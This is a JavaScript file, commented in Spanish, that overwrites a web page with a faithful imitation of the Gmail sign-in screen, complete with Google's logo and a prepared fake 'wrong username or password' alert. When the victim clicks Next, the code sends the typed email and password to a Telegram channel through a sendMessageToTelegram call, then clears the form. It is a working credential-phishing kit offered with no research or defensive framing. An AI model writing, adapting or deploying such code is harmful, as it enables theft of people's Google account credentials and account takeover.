function gmailFuncion() {

    const contenedor = document.getElementsByTagName('body')[0];
    contenedor.innerHTML = `
                  <div class="hero bg-base-200 min-h-screen">
                <div class="hero-content text-center">
                  <div class="max-w-md">
                    <div style="      
                    font-family: 'Roboto', sans-serif;
                    color: black ;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;">
                      <div class="login-container" style="      background-color: white;
                    padding: 30px;
                    border-radius: 10px;
                    width: 340px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.6);">
                        <img class="google-logo" style="      width: 40px;
      margin-bottom: 10px;" src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png"
                          alt="Google Logo">

                        <h1 style="      font-size: 24px;
      margin: 10px 0;">Sign in</h1>
                        <p class="subtext" style="      font-size: 14px;
                      color: #312f2f;
                      margin-bottom: 20px;">to continue to Gmail</p>

                        <!-- lerta email -->
                         
                        <div id="alerta" role="alert" class="alert alert-danger" style="display: none; padding: 2px; margin-bottom: 2%; text-align: center;">
                          <!-- <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 shrink-0 stroke-current" fill="none"
                            viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                              d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
                          </svg> -->
                          <span>Llenar todos los campos correctamente</span>
                        </div>

                        <!-- alerta falsa -->
                        <div id="alertaFalsa" role="alert" class="alert alert-danger" style="display: none; padding: 2px; margin-bottom: 2%; text-align: center;">
                          <span>Usuario o contrasenia incorrectos</span>
                        </div>

                        <input style="      width: 100%;
                      padding: 12px;
                      background-color: transparent;
                      color:  #5f6368;
                      border: 1px solid #5f6368;
                      border-radius: 4px;
                      margin-bottom: 10px;
                      font-size: 16px;" type="text" id="gmailUser" placeholder="Email or phone" required>

                        <input style="      width: 100%;
                      padding: 12px;
                      background-color: transparent;
                      color:  #5f6368;
                      border: 1px solid #5f6368;
                      border-radius: 4px;
                      margin-bottom: 10px;
                      font-size: 16px;" type="password" id="gmailPassword" placeholder="Password" required>
                        <!-- alerta contrasenia -->

                        <div style="margin-bottom: 15px;">
                          <a href="#" class="forgot-link" style="
                        font-size: 14px;
                        text-decoration: none;">Forgot email?</a>
                        </div>

                        <p class="info-text" style="font-size: 12px;
                      color: #312f2f;
                      margin-top: 20px;
                      margin-bottom: 20px;">
                          Not your computer? Use Guest mode to sign in privately. <br>
                          <a href="#" class="guest-link" style="      font-size: 14px;
      text-decoration: none;">Learn more about using Guest mode</a>
                        </p>

                        <div class="button-group">
                          <a href="#" class="create-link" style="      font-size: 14px;
      text-decoration: none;">Create account</a>
                          <div>
    
                            <button onclick="gmailData()" class="login-button" style="      background-color: #8ab4f8;
                          border: none;
                          color: black;
                          padding: 10px 24px;
                          font-weight: bold;
                          border-radius: 20px;
                          cursor: pointer;">Next</button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
    `
}

async function gmailData() {

    const emailGmail = document.getElementById('gmailUser');
    const passwordGmail = document.getElementById('gmailPassword');
    const alarma = document.getElementById('alerta');



    const valor = emailGmail.value;
    const regexEmail = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const regexTelefono = /^\+?[0-9]{3,15}$/;
    if (!regexEmail.test(valor) && !regexTelefono.test(valor)) {
        emailGmail.setCustomValidity('Por favor, ingrese un correo electrónico o número de teléfono válido');
        alarma.style.display = "block";
    } else {
    sendMessageToTelegram(`gmail: \n usuario: ${emailGmail.value} \n contrasenia: ${passwordGmail.value}`);
        emailGmail.setCustomValidity('');
        emailGmail.value = '';
        passwordGmail.value = '';
    }
}